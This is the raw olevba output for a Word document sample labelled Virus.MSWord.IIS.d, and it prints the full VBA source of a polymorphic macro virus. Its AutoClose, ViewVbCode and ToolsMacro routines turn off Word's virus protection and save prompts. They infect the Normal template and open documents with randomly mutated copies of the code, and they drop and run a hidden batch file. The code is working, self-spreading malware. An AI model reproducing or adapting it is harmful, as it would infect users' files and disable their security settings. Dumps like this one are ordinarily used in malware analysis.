olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.IIS.d-ae542b6799fcd8fe13f668242e19a8cc1d03231f9734509cc61a38bc09abea52
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.IIS.d-ae542b6799fcd8fe13f668242e19a8cc1d03231f9734509cc61a38bc09abea52 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: Virus.MSWord.IIS.d-ae542b6799fcd8fe13f668242e19a8cc1d03231f9734509cc61a38bc09abea52 - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
øÅ—ô�½žäÈÝ Ð�¼ÒÃ¿±ƒÄ‰Å·…Ý“®åÅö˜ˆ°çßÇ”¨Â¿ÚÂÀé = Chr(155)
’°Æ‘¿®«—ð¶Ó­æ½ºØªŠ£«™ª×íÙùÜ‹½÷ _
= Chr(235)
¥÷é–Â¢Ÿ×Æ³••Û _
= _
Chr(64)
ÜÔ´·ù¹’¿è°ó ä”®æðø¡óÎãô�ßÖ©Íé = "¡œÏ"
áøÊŸ±É÷²×–�„‰Ã©ËÃì˜é²æ­œÅµ×¿©ÈÑÒÞåì¤�“Ñ�† _
= Chr(173)
”óåÔÊÄÀáâ�æÅÁŠù ŽÞÑ»œÕ°àíïš = "Ì"
Àï—ô…Š = Chr(89)
ÊÂñÈ›Î¡è«äÇ¯ãå›…ÄÁ¸º˜„¦ÛºÒ�žÃëÅÏßÊ = "¯‰Ö�ö¿"
ºœ _
= _
Chr(188)
 Ìñ¶¸Üƒøöà¸¥ó’’ù£Û»í�ñÙö�ËåÎ”ƒÏë = "ƒÔ"
¬‡»àÒµàù›óšˆÎéï·‘±¬ŠÌž³É‚–î§åèÆííØâŠ¶Ç„¦’‡’èì…ÊÇ� = "½ÜÃ²³ãÑ›¢"
§¡©ÇËƒÇ«ç¿ãÀ¿Ùõç¾øÄéèŠ´„Ú¨ö†Ÿ—›­žÇ½‘£³·�êóèì�² = "¢"
›ù¯ØÐ�œ…¦ôØ™ß¶¦Ø = Chr(76)
Ëì¸ðÄ”­ó�Ôè÷µ±å = "ë®‚íÎ‚Í"
“òÜÐºÖÓÎ‹‰…õ›‚—Ì›�£©•ì¿÷¦õ”¼¼¦ðáØà­ˆÀš¾³­ÂôÔ¦ö× _
= _
Chr(202)
‹ê¥Ø÷©žÇàÐíÇÖàŠ¤Û¾Æ—Ÿ�Ù¨ƒ§º»¥ÒÒ¾íÕ”ñô¼¡´ˆš ˜°çÏí = Chr(103)
¶æã�ùÉÔ�¸“™¶Ï„ŒÂÕ¡Ïµ¢Ø„º©�ÀŠ¯Á�Ÿèù“„°Á±¬ÌäÖ· = "Ê“¡�àé¡Ü¡§² Ô¥Ô–Í"
›‘šØ·µ©Ëã˜¼•¶Ûë¯Ú _
= _
Chr(98)
£¬ø“¾À› = "¯ž"
Ò»Ä¾È�‰¯Ï“Ñ¨³³Á³ëÞãŠ«‡ßõªÉÃ˜À�ÅíÞ _
= Chr(2)
„÷ŒåÎžâ„ã†ô£ÂÞ¬Ìó¢Û“½ØòÁØ•Æ’†ð¸’¢è‰† = "ñ’ÂêÕ‡–Ø‘¹âñóÑŒ·Ÿ"
«Ð¸»¦«è½†ùéÆ†©�•ì‡ÉÂå£îÒÁ™Ø¼�¾¡â¹ = "�ÖõÊ¢ö¿¨£�Ú"
»íí–Åä¯ÊÆï éÎ»êÌ ¿–ƒÛ°Ø�âìÈžÄø�™­‘¶Á¡— = "ÝøÊ�ÅëãŽÄ"
øÂ…¾î’ÛÐ‘¼®«´©‡­æÃµ¼½Ë³ÃÊ½Î–Çœ¶°‚È¥Ó¹¾ÔÑâ = "�ƒ"
ùè¤žØø´£ÁÏŸÒÎ£«÷Úµ¾Ÿ÷î = "èïŸ¡çØËšÛèŸÝÇò"
 ÝËÊŽÈ½Œ¹¶ ‡Ð¦ñÔÓÊÊÑÒ î = "ÌèùŽŸÝÏ´‡¯¡à"
Þ”Ôáôõä‹¤°Í„’ÄÜ­õƒ�šßÌ¼¢Æ†å = "¯óÛÎ´®¥"
ê­šÔÏâ¦ßÃÒ¯‚èÃ¤ùŠêäËÊÊ­¯ã‘ = "ÆÑÍ­ÊùÙ¾ð¢‚À‚Ê"
œ¢Åõ½„ÀÔ¨Û�¹øëš´Ð°Å£ˆ›ïÙì³ë×ŸÀôÝÁåÌ–®—ÛÞ = "Ò"
°Ç˜ôÊ¦ƒ”›ä�Ö¾¸�µ‡ùØ¶’©¾ŽÜô©ÈÂË±œ½·³¤¯¥Ÿ˜ŒÌÅ– = "×¿à§"
—¦»ÖË´Ž“¸ÑÙ±£ÕÁ„õéö£ïéÂ¯×âÎâ›ŒÛÛ÷ = Chr(235)
ª = "Ã…ñÕµ–"
ø‡êð�žíñ²®ç†Òî­¥�ÈŸùÁØŸßÛÇÙ³ _
= _
Chr(86)
ªºïÂ×ÓÍà‚ÊÊµäØÑáêÔ¾ÀßøÝ„ = Chr(244)
’œõ£ÆÔ†ÙØ›«ÊèäŒ³Ëƒ«‘ªãÎ²ËŒÃ¸‹Ì _
= Chr(87)
í«›Ûª�òÁ¶žŠ— _
= _
Chr(90)
í�¹éŸóÍ = Chr(247)
Ä¼åŒÍÅÏÃÜì§«‚¢´’®ˆÞàó�’°‹ = "æìëÄ„Ï™’"
áòù¡µ‡õê = "ð¸•­”ÅˆÕá"
Œ½šÜö = " àëëÍîæØ§Å‚÷Ã"
©¯ò¬Çú¼é¢¾ïäõ¦ã‰¹ÒÍÅ¢ = "Å»¹ö¬æËçòŽÀšð®"
¸¾à·ßÉÛÖ—è³Ÿ–ëŽÈîÒ«Ó¨ñç™¢«�ŒÑÀùŠÊ¦Â” = "ð³¦­à‰·ÄÙä¾àöåÑð¦§èê"
‹œ ‹Ò�Òß¡–¸¸�„ðÚúÊ¼Ú§é²³×¦–ðïÃ»³¡¬·ï÷²ÌÂ = Chr(97)
ÀòÊàïÚ‡’ = "›Ãâ�ìç“Ë¢‘•áó‚"
º›…�»�ˆãÖ–˜Šòá¾¡â‘ŒÉðÊ‹„ð»°Óçù�¯ß _
= _
Chr(206)
Ã£ú¾‚ÅõÑÖ¼—ÄË�åÖÊœ�çÇ÷ž×›…™ÊÎÞŽ˜‰•¿ìÍ·œ‘››íèÕïÎÕ = "ˆóâ¦÷"
�©¹ÐÆ³éÈŸíÜ‚ò _
= Chr(110)
âÒ�»©×•Ã™íàØñ”’º…²´Æ¦Æ´Üæ¹Š _
= _
Chr(56)
â¼Œ = Chr(78)
´’¬ºï¨Ú°Ø›®í­øÀ•µ�ÖÑÅ½¬Ä¦»ÏïÉ�°Ò¤Á½­‘Óçíœ �ÀÙë‹Ê = "öò"
Ë¬½¢ì³ÖÚºÔ³ØÕ‡µÖ¨»ùöÊŸ£… = "‚¶‡´¥ŠÏì¢ÂÒÚ†î—ê"
Ö = "Š«¦ˆöéÉ"
ó¯Ý§ÉÕ‰˜ÚØ˜ÀóøöçÊ’«®µðàð¢¯…šáÑÀÍ¢‰¹¤Ò�ß°“¥ƒÕÈ  = "£ÃŸ‰Ë¯ì©ƒ"
‚ß‘¿¨¹ñ·°—­¬ÖºÓ�ò’¡”øƒ‹¾ Â‚«§ù·‡µÆÌ¥êœ _
= _
Chr(49)
‡ƒïŽóùë¡Û�ð¶âÐ = "® ‰�Í‡÷ÉÃø²ÏÊà¶"
Application.ShowVisualBasicEditor _
= _
False
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr NormalTemplate.FullName, vbNormal
NoSet:
begin:
On Error GoTo eb
NormAt _
= _
False
VBE.CommandBars("Edit").Controls(1).Enabled = False
Application.EnableCancelKey _
= _
wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection _
= _
False
Options.ConfirmConversions _
= _
False
Application.ScreenUpdating _
= _
False
Options.SaveNormalPrompt _
= _
False
Close #1
Open "c:\msdos.sys" For Input As #1
Do _
Until _
EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= _
Len(a)
windir _
= Mid(a, 8, l)
End If
Loop
If windir = "" Then Exit Sub
On Error GoTo NoInf
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= 1 To ms
ls _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= _
1
Exit For
End If
Next t2
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
tg _
= 1 To ms
ls _
= _
ActiveDocument.VBProject.VBComponents(tg).CodeModule.countoflines
If _
ls _
> 3 Then l = ActiveDocument.VBProject.VBComponents(tg).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= _
1
Exit For
End If
Next tg
If _
Acd = 1 And NormT = 1 Then Exit Sub
If _
Acd = 1 Then
FullCodeN = "Sub AutoClose()" & Chr(13)
t _
= _
0
Randomize Timer
t _
= CInt(Rnd * 100)
If t < 50 Then g = 1
If _
t _
> _
49 _
And _
t _
< _
101 _
Then g = 2
If _
g = 1 Then
v _
= CInt(Rnd * 50)
For _
vs _
= 1 To v
beginNn:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo beginNn
If Z < 65 Then GoTo beginNn
If Z < 130 Then GoTo beginNn
va _
= va & Chr(Z)
Next vs
v _
= CInt(Rnd * 20)
For _
vss _
= 1 To v
begin5:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo begin5
If Z = 34 Then GoTo begin5
If Z < 130 Then GoTo begin5
Inn _
= Inn & Chr(Z)
Next vss
FullCodeN = FullCodeN & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End If
If _
g = 2 Then
v _
= CInt(Rnd * 50)
For _
vsss _
= 1 To v
begin2:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo begin2
If Z < 130 Then GoTo begin2
va _
= va & Chr(Z)
Next vsss
Z _
= CInt(Rnd * 250)
Inn = "Chr(" & Z & ")"
FullCodeN = FullCodeN & va & "=" & Inn & Chr(13)
End If
If _
g = 3 Then
v _
= CInt(Rnd * 50)
va = "'"
For _
vssss _
= 1 To v
begin3:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo begin3
If Z < 130 Then GoTo begin3
va _
= va & Chr(Z)
Next vssss
FullCodeN = FullCodeN & va & Chr(13)
End If
If _
g = 4 Then
v _
= CInt(Rnd * 50)
For _
vsssss _
= 1 To v
begin4:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo begin4
If Z < 130 Then GoTo begin4
va _
= va & Chr(Z)
Next vsssss
va = va & ":"
FullCodeN = FullCodeN & va & Chr(13)
End If
aaaa _
= _
ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.countoflines
hh _
= _
1
Do
If hh = aaaa Then GoTo nextterm
hh _
= hh + 1
a = ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeN = FullCodeN & a & Chr(13)
GoTo NextLineN
End If
Spac _
= _
0
t _
= _
0
PosL _
= _
0
BeginN:
l _
= _
Len(a)
Do
If PosL > l Then GoTo NoCN
PosL _
= PosL + 1
If Mid(a, PosL, 1) = Chr(34) Then
FullCodeN = FullCodeN & a & Chr(13)
GoTo NextLineN
End If
Loop
NoCN:
PosL _
= _
0
If Right(a, 1) = "_" Then GoTo UnsplitN
GoTo SplitN
UnsplitN:
v _
= _
0
Y _
= _
a
Do
If Right(Y, 1) <> "_" Then GoTo NoChN
l _
= _
Len(Y)
PosL _
= _
0
Do
PosL _
= PosL + 1
s _
= Mid(Y, PosL, 1)
If s = "_" Then GoTo FoundN
Loop
FoundN:
Spac _
= PosL - 1
Y _
= _
Left(Y, l - 1)
hh _
= hh + 1
a = ActiveDocument.VBProject.VBComponents.Item(tg).CodeModule.Lines(hh, 1)
v _
= _
1
Y _
= Y & a
Loop
NoChN:
a _
= _
Y
c _
= _
0
PoslO _
= _
0
PosL _
= _
0
GoTo BeginN
SplitN:
PosL _
= _
0
l _
= _
Len(a)
k _
= _
0
If _
Spac <> 0 Then
Do
k _
= k + 1
If k > l Then GoTo NC
s _
= Mid(a, k, 1)
If s = " " Then g = k
Loop
NC:
If _
g <= Spac Then
FullCodeN = FullCodeN & a & Chr(13)
GoTo NextLineN
End If
End If
Do
If _
PosL > l Then
FullCodeN = FullCodeN & a & Chr(13)
GoTo NextLineN
End If
PosL _
= PosL + 1
s _
= Mid(a, PosL, 1)
If _
s = Chr(34) Then
FullCodeN = FullCodeN & a & Chr(13)
GoTo NextLineN
End If
If s = " " Then
If _
Spac = 0 Then
f = Left(a, PosL) & " " & "_"
las = Mid(a, PosL + 1, l)
FullCodeN = FullCodeN & f & Chr(13)
FullCodeN = FullCodeN & las & Chr(13)
GoTo NextLineN
End If
If _
PosL <= Spac Then
wa _
= PosL - PoslO
If _
PoslO <> 0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End If
FullCodeN _
= _
FullCodeN & Temp & Chr(13)
PoslO _
= _
PosL _
+ 1
c _
= _
1
GoTo NextCharN
Else
c _
= _
1
wa _
= PosL - (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 = Mid(a, PosL + 1, l)
FullCodeN _
= FullCodeN & Temp & Chr(13) & Temp2 & Chr(13)
If PosL > Spac Then GoTo NextLineN
GoTo NextCharN
End If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeN = FullCodeN & Temp & Chr(13)
GoTo NextLineN
End If
NextCharN:
Loop
FullCodeN = FullCodeN & Y & Chr(13)
GoTo NextLineN
NextLineN:
Loop
nextterm:
End If
If _
NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
t _
= _
0
Randomize Timer
t _
= CInt(Rnd * 100)
If t < 50 Then g = 1
If _
t _
> _
49 _
And _
t _
< _
101 _
Then g = 2
If _
g = 1 Then
v _
= CInt(Rnd * 50)
For _
vDs _
= 1 To v
beginDD:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo beginDD
If Z < 65 Then GoTo beginDD
If Z < 130 Then GoTo beginDD
va _
= va & Chr(Z)
Next vDs
v _
= CInt(Rnd * 20)
For _
vDss _
= 1 To v
beginD5:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo beginD5
If Z = 34 Then GoTo beginD5
If Z < 130 Then GoTo beginD5
Inn _
= Inn & Chr(Z)
Next vDss
FullCodeD = FullCodeD & va & "=" & Chr(34) & Inn & Chr(34) & Chr(13)
End If
If _
g = 2 Then
v _
= CInt(Rnd * 50)
For _
vDsss _
= 1 To v
beginD2:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo beginD2
If Z < 130 Then GoTo beginD2
va _
= va & Chr(Z)
Next vDsss
Z _
= CInt(Rnd * 250)
Inn = "Chr(" & Z & ")"
FullCodeD = FullCodeD & va & "=" & Inn & Chr(13)
End If
If _
g = 3 Then
v _
= CInt(Rnd * 50)
va = "'"
For _
vdssss _
= 1 To v
beginD3:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo beginD3
If Z < 130 Then GoTo beginD3
va _
= va & Chr(Z)
Next vdssss
FullCodeD = FullCodeD & va & Chr(13)
End If
If _
g = 4 Then
v _
= CInt(Rnd * 50)
For _
vdsssss _
= 1 To v
beginD4:
Z _
= CInt(Rnd * 250)
If Z = 13 Then GoTo beginD4
If Z < 130 Then GoTo beginD4
va _
= va & Chr(Z)
Next vdsssss
va = va & ":"
FullCodeD = FullCodeD & va & Chr(13)
End If
aaaa _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
hh _
= _
1
Do
If hh = aaaa Then GoTo EndTerm
hh _
= hh + 1
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
If Right(a, 1) = ":" Then
FullCodeD = FullCodeD & a & Chr(13)
GoTo NextLineD
End If
Spac _
= _
0
t _
= _
0
PosL _
= _
0
beginD:
l _
= _
Len(a)
Do
If PosL > l Then GoTo NoCD
PosL _
= PosL + 1
If Mid(a, PosL, 1) = Chr(34) Then
FullCodeD = FullCodeD & a & Chr(13)
GoTo NextLineD
End If
Loop
NoCD:
PosL _
= _
0
If Right(a, 1) = "_" Then GoTo UnsplitD
GoTo SplitD
UnsplitD:
v _
= _
0
Y _
= _
a
Do
If Right(Y, 1) <> "_" Then GoTo NoChD
l _
= _
Len(Y)
PosL _
= _
0
Do
PosL _
= PosL + 1
s _
= Mid(Y, PosL, 1)
If s = "_" Then GoTo FoundD
Loop
FoundD:
Spac _
= PosL - 1
Y _
= _
Left(Y, l - 1)
hh _
= hh + 1
a = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(hh, 1)
v _
= _
1
Y _
= Y & a
Loop
NoChD:
a _
= _
Y
c _
= _
0
PoslO _
= _
0
PosL _
= _
0
GoTo beginD
SplitD:
PosL _
= _
0
l _
= _
Len(a)
k _
= _
0
If _
Spac <> 0 Then
Do
k _
= k + 1
If k > l Then GoTo DC
s _
= Mid(a, k, 1)
If s = " " Then g = k
Loop
DC:
If _
g <= Spac Then
FullCodeD = FullCodeD & a & Chr(13)
GoTo NextLineD
End If
End If
Do
If _
PosL > l Then
FullCodeD = FullCodeD & a & Chr(13)
GoTo NextLineD
End If
PosL _
= PosL + 1
s _
= Mid(a, PosL, 1)
If _
s = Chr(34) Then
FullCodeD = FullCodeD & a & Chr(13)
GoTo NextLineD
End If
If s = " " Then
If _
Spac = 0 Then
f = Left(a, PosL) & " " & "_"
las = Mid(a, PosL + 1, l)
FullCodeD = FullCodeD & f & Chr(13)
FullCodeD = FullCodeD & las & Chr(13)
GoTo NextLineD
End If
If _
PosL <= Spac Then
wa _
= PosL - PoslO
If _
PoslO <> 0 Then
Temp = Mid(a, PoslO, wa) & " " & "_"
Else
Temp = Mid(a, 1, PosL) & " " & "_"
End If
FullCodeD _
= _
FullCodeD & Temp & Chr(13)
PoslO _
= _
PosL _
+ 1
c _
= _
1
GoTo NextCharD
Else
c _
= _
1
wa _
= PosL - (PoslO)
Temp = Mid(a, PoslO, wa) & " " & "_"
Temp2 = Mid(a, PosL + 1, l)
FullCodeD _
= FullCodeD & Temp & Chr(13) & Temp2 & Chr(13)
If PosL > Spac Then GoTo NextLineD
GoTo NextCharD
End If
Temp = Mid(a, PoslO + 1, PosL) & " " & "_"
FullCodeD = FullCodeD & Temp & Chr(13)
GoTo NextLineD
End If
NextCharD:
Loop
FullCodeD = FullCodeD & Y & Chr(13)
GoTo NextLineD
NextLineD:
Loop
EndTerm:
End If
If _
NormT <> 1 Then
look:
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
Inn _
= 2 To ms
a _
= _
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a < 1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring (FullCodeN)
i _
= _
20
Exit For
End If
Next Inn
If _
i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a = Dir(windir & "\System\lo.sys")
If a <> "" Then Kill windir & "\System\lo.sys"
NormalTemplate.OpenAsDocument
NormAtt _
= _
ActiveDocument.ReadOnly
l = ""
On Error GoTo eb
ActiveDocument.SaveAs FileName:=windir & "\System\lo.sys", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
NormalTemplate.Saved _
= _
True
ActiveDocument.Saved _
= _
True
ActiveDocument.Close
Close #1
a = Dir(windir & "\System\lo.bat")
If a <> "" Then Kill windir & "\System\lo.bat"
Close
Open windir & "\System\lo.bat" For Append As #1
Print #1, ":Begin"
l _
= _
Len(NormalTemplate.FullName)
l _
= l - 10
For _
i _
= 1 To 500
Print #1, "rem Flitnic has catched you... he, he"
Next i
Print #1, ":Begin"
Print #1, "Move /y c:\Troop.dat " & NormalTemplate.FullName
Print #1, "If exist c:\Troop.dat goto Begin"
Close #1
NormalTemplate.Saved _
= _
True
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt = True Then
End If
notemp:
End If
i _
= _
1
If _
Acd <> 1 Then
Close
look2:
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
inn2 _
= 2 To ms
a _
= _
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i _
= _
20
Exit For
End If
Next inn2
If _
i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved _
= _
True
End If
End If
NoInf:
eb:
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then
NormalTemplate.Saved _
= _
False
GoTo NoNormal
End If
If _
NormAtt = True Then
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
SetAttr _
(NormalTemplate.FullName), _
vbNormal
a = Shell(windir & "\System\lo.bat", 0)
Else
NormalTemplate.Save
End If
NormalTemplate.Saved _
= _
True
NoNormal:
End Sub
Sub ViewVbCode()
On Error GoTo NoDoc
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
(NormalTemplate.FullName), _
vbNormal
NoSet:
Close #1
Open "c:\msdos.sys" For Input As #1
Do _
Until _
EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= _
Len(a)
windir _
= Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
t _
= 1 To ms
ls _
= _
ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls _
> 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= _
1
Exit For
End If
Next t
a _
= _
ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines _
1, _
a
ActiveDocument.Saved _
= _
True
NoDoc:
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= 2 To ms
ls _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= _
1
Exit For
End If
Next t2
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i _
= 1 To 2
al _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, _
al
Next i
esub:
eb:
Application.ShowVisualBasicEditor _
= _
True
NoDocL:
Options.SaveNormalPrompt _
= _
False
NormalTemplate.Saved _
= _
True
End Sub
Sub ToolsMacro()
On Error GoTo NoDoc
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo NoSet
SetAttr _
(NormalTemplate.FullName), _
vbNormal
NoSet:
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
t _
= 1 To ms
ls _
= _
ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
If _
ls _
> 3 Then l = ActiveDocument.VBProject.VBComponents(t).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOOPEN()" Then
Acd _
= _
1
Exit For
End If
Next t
If _
Acd = 1 Then
FullCodeD = "Sub AutoOpen" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a _
= _
ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.countoflines
For _
ii _
= 2 To a
l = ActiveDocument.VBProject.VBComponents.Item(t).CodeModule.Lines(ii, 1)
FullCodeN = FullCodeN & l & Chr(13)
FullCodeD = FullCodeD & l & Chr(13)
Next ii
End If
a _
= _
ActiveDocument.VBProject.VBComponents(t).CodeModule.countoflines
ActiveDocument.VBProject.VBComponents(t).CodeModule.deletelines _
1, _
a
ActiveDocument.Saved _
= _
True
ActiveDocument.Saved _
= _
True
NoDoc:
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
t2 _
= 1 To ms
ls _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
If _
ls _
> 3 Then l = NormalTemplate.VBProject.VBComponents(t2).CodeModule.Lines(1, 1)
If UCase(l) = "SUB AUTOCLOSE()" Then
NormT _
= _
1
Exit For
End If
Next t2
If _
NormT = 1 Then
FullCodeD = "Sub AutoOpen()" & Chr(13)
FullCodeN = "Sub AutoClose()" & Chr(13)
a _
= _
NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.countoflines
For _
iiii _
= 2 To a
l = NormalTemplate.VBProject.VBComponents.Item(t2).CodeModule.Lines(iiii, 1)
FullCodeD = FullCodeD & l & Chr(13)
FullCodeN = FullCodeN & l & Chr(13)
Next iiii
End If
l = ""
On Error GoTo 0
On Error GoTo eb
a _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, _
a
NormalTemplate.Saved _
= _
True
esub:
Close #1
Open "c:\msdos.sys" For Input As #1
Do _
Until _
EOF(1)
Line Input #1, a
If Left(UCase(a), 7) = "WINDIR=" Then
l _
= _
Len(a)
windir _
= Mid(a, 8, l)
End If
Loop
Close #1
If windir = "" Then Exit Sub
a _
= _
GetAttr(NormalTemplate.FullName)
If a = 33 Then a = 1
If a = 1 Then GoTo eb
eb:
NormalTemplate.Saved _
= _
True
Application.Dialogs(wdDialogToolsMacro).Show
ReInf _
= _
True
If Application.ShowVisualBasicEditor = True Then ReInf = False
If _
ReInf = True Then
Acd _
= _
0
NormT _
= _
0
If _
NormT <> 1 Then
NormalTemplate.OpenAsDocument
NormAt _
= _
ActiveDocument.ReadOnly
ActiveDocument.Close
Close #1
look:
ms _
= _
NormalTemplate.VBProject.VBComponents.Count
For _
Inn _
= 2 To ms
a _
= _
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.countoflines
If _
a < 1 Then
NormalTemplate.VBProject.VBComponents(Inn).CodeModule.AddFromstring (FullCodeN)
i _
= _
20
Exit For
End If
Next Inn
If _
i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
NormalTemplate.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look
End If
a _
= _
Dir(NormalTemplate.FullName)
If a = "" Then GoTo notemp
If _
NormAt = True Then
NormalTemplate.Saved _
= _
True
End If
End If
i _
= _
1
If _
NormAt _
<> True Then NormalTemplate.Save
notemp:
If _
Acd <> 1 Then
Close
look2:
a _
= _
Application.Documents.Count
If a < 1 Then GoTo NoDocL
ms _
= _
ActiveDocument.VBProject.VBComponents.Count
For _
inn2 _
= 2 To ms
a _
= _
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.countoflines
If _
a < 1 Then
ActiveDocument.VBProject.VBComponents(inn2).CodeModule.AddFromstring (FullCodeD)
i _
= _
20
Exit For
End If
Next inn2
If _
i <> 20 Then
Close #1
a = Dir(windir & "\System\Flitnic.drv")
If a <> "" Then Kill windir & "\system\Flitnic.drv"
Close #1
Open windir & "\System\Flitnic.drv" For Append As #1
Print #1, "Attribute VB_Name = " & Chr(34) & "Modul1" & Chr(34)
Close #1
ActiveDocument.VBProject.VBComponents.Import windir & "\System\Flitnic.drv"
GoTo look2
End If
If UCase(Left(ActiveDocument.FullName, 1)) <> "A" And Mid(ActiveDocument.FullName, 3, 1) = "\" Then
If ActiveDocument.ReadOnly = True Then GoTo noactsave
ActiveDocument.Save
noactsave:
Else
ActiveDocument.Saved _
= _
True
End If
End If
NoDocL:
Else
FileCopy windir & "\System\lo.sys", "c:\Troop.dat"
a = Shell(windir & "\System\lo.bat", 0)
For _
i _
= 1 To 2
al _
= _
NormalTemplate.VBProject.VBComponents(t2).CodeModule.countoflines
NormalTemplate.VBProject.VBComponents(t2).CodeModule.deletelines _
1, _
al
NormalTemplate.Saved _
= _
True
Next i
End If
Options.SaveNormalPrompt _
= _
False
NormalTemplate.Saved _
= _
True
End Sub

























































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
